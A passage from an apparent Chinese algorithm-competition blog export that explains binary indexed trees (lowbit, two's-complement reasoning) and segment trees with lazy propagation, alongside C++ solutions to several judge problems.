class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x&gt;=<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ans+=c2[x];</span><br><span class="line">            x-=Lowbit(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(num==<span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x&gt;=<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ans+=c3[x];</span><br><span class="line">            x-=Lowbit(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(num==<span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x&gt;=<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ans+=c4[x];</span><br><span class="line">            x-=Lowbit(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(num==<span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x&gt;=<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ans+=c5[x];</span><br><span class="line">            x-=Lowbit(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=In();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i]=In()+<span class="number">1</span>;</span><br><span class="line">        maxx=max(maxx,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> This=<span class="number">1</span>;</span><br><span class="line">        Plus(a[i],This,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> j=<span class="number">2</span>;j&lt;=<span class="number">5</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> This=Sum(a[i]<span class="number">-1</span>,j<span class="number">-1</span>);</span><br><span class="line">            Plus(a[i],This,j);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;Sum(maxx,<span class="number">5</span>)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>树状数组</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉索引树(树状数组)——讲解</title>
    <url>/2017/05/20/a30c242f3174/</url>
    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><blockquote>
<p>追随树神的脚步！然而树神写的PPT还是很良心的，很快就看懂了，题解也不错。</p>
</blockquote>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><blockquote>
<p>然后树状数组是不需要建树的，它的树成分并没有线段树那么强，是通过一个特殊的Lowbit来建立起来的；</p>
</blockquote>
<p>树状数组的实现方式是用一个c数组维护原来的数组a，</p>
<h2 id="Lowbit讲解："><a href="#Lowbit讲解：" class="headerlink" title="Lowbit讲解："></a>Lowbit讲解：</h2><p><code>c[i]=sum(a[j])</code>  <code>i-lowbit(i)+1&lt;=j&lt;=i;</code></p>
<p>这里的 <code>lowbit(i)</code> 表示将i转换成二进制后的最右边的1到最后所形成的十进制的数。</p>
<p>例如 <code>lowbit(6)=lowbit(110)2=(10)2=2</code></p>
<p>所以 <code>c[6]=a[5]+a[6];</code></p>
<p><code>lowbit(4)=lowbit(100)2=(100)2=4</code></p>
<p><code>c[4]=a[1]+a[2]+a[3]+a[4]</code></p>
<p><code>lowbit[5]=lowbit(101) 2 =(1) 2=1;</code></p>
<p> <code>c[5]=a[5]</code></p>
<h2 id="Lowbit公式："><a href="#Lowbit公式：" class="headerlink" title="Lowbit公式："></a>Lowbit公式：</h2><p>下面是重点！！！</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">lowbit(i)=i&amp;(-i);</span><br></pre></td></tr></table></figure>
<h2 id="公式原理："><a href="#公式原理：" class="headerlink" title="公式原理："></a>公式原理：</h2><p>上面这个公式是非常重要的，就是通过求出一个数的 <code>Lowbit</code> 将这些数据建立成一个树的，父子节点和线段树关系类似，都是通过某种固定的方式建立起来的。而 <code>lowbit</code> 的原理就是利用了计算机里面的反码和补码（这世界本来就是二进制的！）</p>
<p>我们都知道在计算机中数使用二进制存储的，<code>int</code> 是 4 字节，例如我们把5换成二进制。 <code>5=00000000 00000000 00000000 00000101</code> 这同时也是5的原码。 原码：一个正数，按照值大小转换成的二进制数；一个负数按照绝对值大小转换成的二进制数，然后最高位补1，称为原码。</p>
<p>那么-5的原码就是 <code>-5=10000000 00000000 00000000 00000101</code> ，其中，最高位的1是符号位。 在计算机中储存一个数用的是补码的形式，要了解补码需要先知道什么是反码。 反码：正数的反码与原码相同，负数的反码为对该数的原码除符号位外各位取反 -5的反码就是： <code>11111111 11111111 11111111 11111010</code></p>
<p>再说补码：正数的补码与原码相同，负数的补码是这个数的反码+1 -5：<code>11111111 11111111 11111111 11111010+1</code> = <code>11111111 11111111 11111111 11111011</code></p>
<p>那么我们利用这个公式 <code>x&amp;(-x)</code> 的意义：</p>
<p><code>6&amp;(-6)</code>:</p>
<p>6:    <code>00000000 00000000 00000000 00000110</code></p>
<p>-6:   <code>11111111 11111111 11111111 11111010</code></p>
<p>Ans:  <code>00000000 00000000 00000000 00000010</code></p>
<p>所以说 <code>lowbit(6)</code> 的结果很明显就是2</p>
<p>节点i的父亲节点为i+lowbit(i) 若需改变a[i]，则c[i]、c[i+lowbit(i)]、    c[i+lowbit(i)+lowbit(i+lowbit(i)]……一直加到上限，就是需要改变的c数组中的元素。</p>
<p>若需查询s[i]，则 <code>c[i]</code> 、 <code>c[i-lowbit(i)]</code> 、<code>c[i-lowbit(i)-lowbit(i-lowbit(i))]</code> ……就是需要累加的c数组中的元素。 这样我们就让复杂度优化到了 <code>O(logn)</code></p>
<blockquote>
<p>觉得不是太懂？？？继续往下看！</p>
</blockquote>
<h2 id="修改代码："><a href="#修改代码：" class="headerlink" title="修改代码："></a>修改代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Change</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> add)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(x&lt;=n)</span><br><span class="line">    &#123;</span><br><span class="line">        c[x]+=add;</span><br><span class="line">        x+=Lowbit(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="查询代码"><a href="#查询代码" class="headerlink" title="查询代码:"></a>查询代码:</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Question</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ans+=c[x];</span><br><span class="line">        x-=Lowbit(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="树状数组原理："><a href="#树状数组原理：" class="headerlink" title="树状数组原理："></a>树状数组原理：</h2><p>然后我再放上一张图QAQ</p>
<p><img src="https://xorex.space/image/022.jpg"></p>
<p>这个就是树状数组在记录的时候，c数组记录的东西，这个本身是一个数组，利用lowbit来建立一个像树一样的结构（上图），然后利用到就像是二分（二进制分）思想，然后不断分开，进行计算。</p>
<p>二进制真的是神奇啊！将十进制狠狠的踩到地上……</p>
<p>1 2 1 3 1 2 1 4 就像是树一样……</p>
<h1 id="P1356求和"><a href="#P1356求和" class="headerlink" title="P1356求和"></a>P1356求和</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>输入一个数列A1,A2….An(1&lt;=N&lt;=100000)，在数列上进行M(1&lt;=M&lt;=100000)次操作，操作有以下两种：</p>
</blockquote>
<ol>
<li>   格式为C I X，其中C为字符“C”，I和X(1&lt;=I&lt;=N,|X|&lt;=10000)都是整数，表示把把a[I]改为X</li>
<li>   格式为Q L R，其中Q为字符“Q”，L和R表示询问区间为<a href="1%3C=L%3C=R%3C=N">L,R</a>，表示询问A[L]+…+A[R]的值。</li>
</ol>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第一行输入N(1&lt;=N&lt;=100000)，表述数列的长度; 接下来N行，每行一个整数(绝对值不超过10000)依次输入每个数； 接下来输入一个整数M(1&lt;=M&lt;=100000)，表示操作数量，接下来M行，每行为C I X或者Q L R。</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>对于每个Q L R 的操作输出答案。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这道题就是一个模板题，我们进行查询，一个区间x到y的时候，我们就先查询y到1的累加和，然后减去x到1的累加和就好了，改变值的时候我们就按照树状数组的定义方法进行修改，所有覆盖到他的数组都需要修改的。</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,a[<span class="number">400000</span>],c[<span class="number">400000</span>];</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">400000</span>],x,y;</span><br><span class="line"><span class="keyword">char</span> Question_or_Change;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">In_int</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">0</span>,F=<span class="number">1</span>; <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch&lt;<span class="string">&#x27;0&#x27;</span>||ch&gt;<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=-F;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(ch&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">char</span> <span class="title">In_char</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch&lt;<span class="string">&#x27;A&#x27;</span>||ch&gt;<span class="string">&#x27;z&#x27;</span>) ch=getchar();</span><br><span class="line">    <span class="keyword">return</span> ch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">Lowbit</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> (x&amp;(-x)); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Question</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x&gt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ans+=c[x];</span><br><span class="line">        x-=Lowbit(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Change</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> add)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(x&lt;=n)</span><br><span class="line">    &#123;</span><br><span class="line">        c[x]+=add;</span><br><span class="line">        x+=Lowbit(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=In_int();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        b[i]=In_int();</span><br><span class="line">        a[i]=a[i<span class="number">-1</span>]+b[i];</span><br><span class="line">        c[i]=a[i]-a[i-Lowbit(i)];</span><br><span class="line">    &#125;</span><br><span class="line">    m=In_int();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Question_or_Change=In_char();</span><br><span class="line">        x=In_int(); y=In_int();</span><br><span class="line">        <span class="keyword">if</span>(Question_or_Change==<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> First=Question(x<span class="number">-1</span>);</span><br><span class="line">            <span class="keyword">int</span> Second=Question(y);</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;Second-First&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(Question_or_Change==<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Change(x,y-b[x]);</span><br><span class="line">            b[x]=y;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="关于树状数组"><a href="#关于树状数组" class="headerlink" title="关于树状数组"></a>关于树状数组</h1><p>如果仅仅从能解决的问题范围上面考虑的话，明显是线段树数要强大很多，而且树状数组能解决的问题，线段树都可以解决的，刚刚我在看到这句话之后，去吧我以前写过的树状数组的题目全部都翻出来了，发现事实的确就是如此，那么学习树状数组的目的是什么呢？以后所有的题目全部都用线段树来解决不就可以了了吗。</p>
<p>但是作为高级数据结构，树状数组的代码非常简洁，有着极其巧妙的 <code>Lowbit</code> 操作，在空间复杂度上面优于线段树，更重要的是在解决多维度问题上面，树状数组的展开能力是非常强的，网上有一句话说：线段树擅长解决横向问题，树状数组擅长解决纵向问题。如果能用树状数组解决，就上树状数组。</p>
<p>最后树状数组和线段树的区别就是（来自知乎的一位朋友精辟的比喻）</p>
<blockquote>
<p>树状数组是站着上厕所的，线段树是蹲着上厕所的……</p>
</blockquote>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>树状数组</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉搜索树(线段树)</title>
    <url>/2017/05/20/fa1ea0787341/</url>
    <content><![CDATA[<h1 id="线段树"><a href="#线段树" class="headerlink" title="线段树"></a>线段树</h1><h2 id="线段树原理："><a href="#线段树原理：" class="headerlink" title="线段树原理："></a>线段树原理：</h2><p>首先，线段树是一棵“树”，而且是一棵完全二叉树。同时，“线段”两字反映出线段树的另一个特点：每个节点表示的是一个“线段”，或者说是一个区间。事实上，一棵线段树的根节点表示的是“整体”的区间，而它的左右子树也是一棵线段树，分别表示的是这个区间的左半边和右半边。</p>
<p>线段树就是这样一种数据结构。它能够将我们需要处理的区间不相交的分成若干个小区间，每次维护都可以在这样一些分解后的区间上进行，并且查询的时候，我们也能够根据这些被分解了的区间上的信息合并出整个询问区间上的查询结构。</p>
<p>下面是个线段树（线段）的图示：</p>
<p><img src="https://xorex.space/image/020.png"></p>
<p>然后这个也是一个线段树（点）的图示：</p>
<p><img src="https://xorex.space/image/021.png"></p>
<p>我们就是利用这种方法搞的。</p>
<h2 id="线段树模板-点-："><a href="#线段树模板-点-：" class="headerlink" title="线段树模板(点)："></a>线段树模板(点)：</h2><p>然后就是DFS模板：</p>
<h3 id="查找最大值："><a href="#查找最大值：" class="headerlink" title="查找最大值："></a>查找最大值：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Search</span><span class="params">(<span class="keyword">int</span> Left,<span class="keyword">int</span> Right,<span class="keyword">int</span> Root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(y&lt;Left||x&gt;Right) <span class="keyword">return</span> <span class="number">-123456789</span>;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;=Left&amp;&amp;y&gt;=Right) <span class="keyword">return</span> a[Root];</span><br><span class="line">    <span class="keyword">int</span> Mid=(Left+Right)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> First=Search(Left,Mid,Root*<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> Second=Search(Mid+<span class="number">1</span>,Right,Root*<span class="number">2</span>+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> max(First,Second);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="修改值："><a href="#修改值：" class="headerlink" title="修改值："></a>修改值：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Change</span><span class="params">(<span class="keyword">int</span> Left,<span class="keyword">int</span> Right,<span class="keyword">int</span> Root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;Left||x&gt;Right) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(Left==Right)</span><br><span class="line">    &#123;</span><br><span class="line">        a[Root]=y;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> Mid=(Left+Right)/<span class="number">2</span>;</span><br><span class="line">    Change(Left,Mid,Root*<span class="number">2</span>);</span><br><span class="line">    Change(Mid+<span class="number">1</span>,Right,Root*<span class="number">2</span>+<span class="number">1</span>);</span><br><span class="line">    a[Root]=max(a[Root*<span class="number">2</span>],a[Root*<span class="number">2</span>+<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是这个仅仅只是一个模板而已。</p>
<p>如果我们需要一种修改一个区间的东西，那么我们上面的方法就不可以了，比如下面的一道题，需要修改一个区间的值。</p>
<h1 id="P1244线段树例题b"><a href="#P1244线段树例题b" class="headerlink" title="P1244线段树例题b"></a>P1244线段树例题b</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>给定一个包含n个数的序列，初值全为0，现对这个序列有两种操作：<br><br>操作1：把 给定 第k1 个数改为k2;<br><br>操作2：查询 从第k1个数到第k2个数得最大值。（k1&lt;=k2&lt;=n）<br>所有的数都 &lt;=100000</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第一行给定一个整数n，表示有n个操作。 以下接着n行，每行三个整数，表示一个操作</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>若干行，查询一次，输出一次。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这道题刚刚开始我使用的方法就是上去一个离散化，用一个数组记录下来对于一个区间的 <code>Lazy</code> 标记（伪），然后在计算最大值的时候加上去这个标记。然后就去了 <code>Debug</code> 发现了一个非常严重的问题这里的n不是一共有n个数，而是下面有n个操作，所以说枚举的范围需要自己找到最大值进行计算。</p>
<p>然后修改之后，发现还是不对，然后自己就开始一步一步的进行打表跟踪，发现自己的离散化在遇到一些特别的情况之下会没有办法处理（梦想破裂乖乖去看了题解），然后题解上面是用到了标记下传的方法，更新 <code>Lazy</code> 之后，利用 <code>DFS</code> 将 <code>Lazy</code> 标记进行下传，然后这样就可以修改了最基础的值，不过要记得下传了 <code>Lazy</code> 标记之后要进行清零。同时下传的时候顺便更新一遍最大值。</p>
<p>这里利用的就是如果需要查找到这个值的话，一路上的 <code>Lazy</code> 和最优值都会进行顺便更新，确保最后的一定就是最优值，然后这样需要的时候进行标记下传，不需要的时候就将其保留下来，留到最后需要使用的时候。有些类似于离散化，这样会可以大大的减少不必要的更新。</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> ID;</span><br><span class="line">    <span class="keyword">int</span> X;</span><br><span class="line">    <span class="keyword">int</span> Y;</span><br><span class="line">&#125;IN[<span class="number">400000</span>];</span><br><span class="line"><span class="keyword">int</span> n,a[<span class="number">400000</span>],x,y,z,Lazy[<span class="number">400000</span>],maxx;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">Read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="number">0</span>; <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch&lt;<span class="string">&#x27;0&#x27;</span>||ch&gt;<span class="string">&#x27;9&#x27;</span>) ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">    &#123; This=This*<span class="number">10</span>+ch-<span class="string">&#x27;0&#x27;</span>; ch=getchar(); &#125;</span><br><span class="line">    <span class="keyword">return</span> This;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Search</span><span class="params">(<span class="keyword">int</span> Left,<span class="keyword">int</span> Right,<span class="keyword">int</span> Root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(y&lt;Left||x&gt;Right) <span class="keyword">return</span> <span class="number">-123456789</span>;</span><br><span class="line">    <span class="keyword">if</span>(Left&gt;=x&amp;&amp;Right&lt;=y) <span class="keyword">return</span> a[Root];</span><br><span class="line">    a[Root*<span class="number">2</span>]+=Lazy[Root];</span><br><span class="line">    a[Root*<span class="number">2</span>+<span class="number">1</span>]+=Lazy[Root];</span><br><span class="line">    Lazy[Root*<span class="number">2</span>]+=Lazy[Root];</span><br><span class="line">    Lazy[Root*<span class="number">2</span>+<span class="number">1</span>]+=Lazy[Root];</span><br><span class="line">    Lazy[Root]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> Mid=(Left+Right)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> First=Search(Left,Mid,Root*<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> Second=Search(Mid+<span class="number">1</span>,Right,Root*<span class="number">2</span>+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> max(First,Second);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Change</span><span class="params">(<span class="keyword">int</span> Left,<span class="keyword">int</span> Right,<span class="keyword">int</span> Root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Left&gt;y||Right&lt;x) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(Left&gt;=x&amp;&amp;Right&lt;=y)</span><br><span class="line">    &#123;</span><br><span class="line">        Lazy[Root]++;</span><br><span class="line">        a[Root]++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    a[Root*<span class="number">2</span>]+=Lazy[Root];</span><br><span class="line">    a[Root*<span class="number">2</span>+<span class="number">1</span>]+=Lazy[Root];</span><br><span class="line">    Lazy[Root*<span class="number">2</span>]+=Lazy[Root];</span><br><span class="line">    Lazy[Root*<span class="number">2</span>+<span class="number">1</span>]+=Lazy[Root];</span><br><span class="line">    Lazy[Root]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> Mid=(Left+Right)/<span class="number">2</span>;</span><br><span class="line">    Change(Left,Mid,Root*<span class="number">2</span>);</span><br><span class="line">    Change(Mid+<span class="number">1</span>,Right,Root*<span class="number">2</span>+<span class="number">1</span>);</span><br><span class="line">    a[Root]=max(a[Root*<span class="number">2</span>],a[Root*<span class="number">2</span>+<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        IN[i].ID=Read();</span><br><span class="line">        IN[i].X=Read();</span><br><span class="line">        IN[i].Y=Read();</span><br><span class="line">        maxx=max(maxx,IN[i].Y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        x=IN[i].X; y=IN[i].Y; z=IN[i].ID;</span><br><span class="line">        <span class="keyword">if</span>(z==<span class="number">1</span>) Change(<span class="number">1</span>,maxx,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(z==<span class="number">2</span>) <span class="built_in">cout</span>&lt;&lt;Search(<span class="number">1</span>,maxx,<span class="number">1</span>)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="P1247贪婪大陆"><a href="#P1247贪婪大陆" class="headerlink" title="P1247贪婪大陆"></a>P1247贪婪大陆</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
